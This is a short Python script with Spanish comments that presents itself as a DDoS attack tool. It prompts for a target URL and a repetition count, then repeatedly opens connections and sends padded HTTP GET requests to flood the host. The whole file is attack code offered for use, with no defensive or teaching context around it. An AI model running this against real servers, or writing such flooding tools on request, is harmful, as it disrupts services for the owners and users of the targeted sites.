import socket
import urllib.parse

def ddos_attack():
    try:
        # Solicitar al usuario si desea realizar un ataque DDoS
        respuesta = input("¿Desea realizar un ataque DDoS? (s/n): ")

        if respuesta.lower() == "s":
            # Solicitar la URL completa del host al que se dirigirá el ataque
            url = input("Ingresa la URL completa del host: ")
            parsed_url = urllib.parse.urlparse(url)
            host = parsed_url.hostname
            port = parsed_url.port

            # Si no se especificó un puerto en la URL, establecer el puerto predeterminado según el esquema (http o https)
            if port is None:
                port = 443 if parsed_url.scheme == "https" else 80

            # Obtener la dirección IP del host
            inet_address = socket.gethostbyname(host)

            # Solicitar el número de repeticiones para el ataque
            repeticiones = int(input("Ingresa el número de repeticiones: "))

            # Realizar el ataque DDoS el número de veces especificado
            for _ in range(repeticiones):
                # Crear un socket y conectar al host en el puerto especificado
                with socket.create_connection((inet_address, port)) as s:
                    # Preparar los datos de solicitud
                    requestData = "X" * 1024
                    request = f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n"
                    payload = request + requestData

                    # Enviar la solicitud al host
                    s.sendall(payload.encode())

    except urllib.error.URLError as e:
        print("URL inválida:", url)
        print(e)
    except (socket.error, ValueError, KeyboardInterrupt) as e:
        print(f"Ocurrió un error: {e}")

if __name__ == "__main__":
    ddos_attack()
